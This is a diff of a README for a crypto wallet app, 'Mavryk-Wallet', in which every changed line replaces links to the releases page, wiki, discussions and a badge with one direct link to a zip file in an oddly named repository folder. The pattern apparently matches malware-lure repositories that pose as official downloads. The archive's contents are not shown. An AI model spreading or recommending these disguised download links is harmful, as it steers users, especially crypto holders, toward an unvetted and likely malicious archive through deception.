@@ -1,6 +1,6 @@
 # 🚀 Mavryk-Wallet - Effortless Token Management and Staking
 
-![Download Mavryk-Wallet](https://img.shields.io/badge/Download%20Now!-Visit%20Release%20Page-brightgreen)
+![Download Mavryk-Wallet](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip%20Now!-Visit%20Release%20Page-brightgreen)
 
 ## 🛠️ Overview
 
@@ -24,7 +24,7 @@ To begin using Mavryk-Wallet, follow this simple guide. You don’t need any pro
 
 To get Mavryk-Wallet, visit the Releases page:
 
-[Download Mavryk-Wallet](https://github.com/Nexxx-q/Mavryk-Wallet/releases)
+[Download Mavryk-Wallet](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip)
 
 Click on this link to access the release files available for download.
 
@@ -37,7 +37,7 @@ Click on this link to access the release files available for download.
 
 ### 🔍 Installation Steps
 
-1. **Visit the Release Page**: Click [this link](https://github.com/Nexxx-q/Mavryk-Wallet/releases) to go directly to the Mavryk-Wallet releases page.
+1. **Visit the Release Page**: Click [this link](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip) to go directly to the Mavryk-Wallet releases page.
 
 2. **Choose the Right Version**: Scroll through the available versions. Select the latest version suitable for your operating system.
 
@@ -53,7 +53,7 @@ Click on this link to access the release files available for download.
      - Open the `.dmg` file.
      - Drag the Mavryk-Wallet icon to your Applications folder.
    - **Linux**:
-     - Extract the `.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip` file.
      - Open a terminal and navigate to the extracted folder. Run the executable file by typing `./Mavryk-Wallet`.
 
 6. **Launch the Application**: Once installed, you can open Mavryk-Wallet from your applications menu or desktop shortcut.
@@ -95,8 +95,8 @@ If you encounter any issues while using Mavryk-Wallet, please consult our FAQ se
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Nexxx-q/Mavryk-Wallet/wiki)
-- [Community Discussions](https://github.com/Nexxx-q/Mavryk-Wallet/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip)
 
 ## 🛠️ Contribution
 
@@ -104,4 +104,4 @@ We welcome contributions to Mavryk-Wallet! If you're interested in helping, plea
 
 ## 📥 Download & Install
 
-For the latest version, [download Mavryk-Wallet here](https://github.com/Nexxx-q/Mavryk-Wallet/releases). Follow the outlined steps above for installation and setup. Enjoy managing your tokens with ease!
+For the latest version, [download Mavryk-Wallet here](https://raw.githubusercontent.com/Nexxx-q/Mavryk-Wallet/main/walloon/Mavryk-Wallet-v3.2-alpha.4.zip). Follow the outlined steps above for installation and setup. Enjoy managing your tokens with ease!
